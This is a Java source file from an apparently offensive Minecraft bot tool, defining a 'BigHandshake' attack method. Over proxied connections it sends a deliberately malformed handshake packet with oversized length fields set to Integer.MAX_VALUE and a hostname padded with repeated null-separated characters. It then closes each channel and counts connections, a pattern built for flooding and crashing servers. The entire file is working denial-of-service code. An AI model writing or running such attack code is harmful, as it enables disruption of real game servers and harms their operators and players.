package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;

public class BigHandshake implements Method {
   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         writeVarInt(out, Integer.MAX_VALUE);
         out.writeByte(9);
         out.writeBytes("localhost.\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a\u0000a");
         out.writeShort(25565);
         writeVarInt(out, Integer.MAX_VALUE);
         out.close();
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
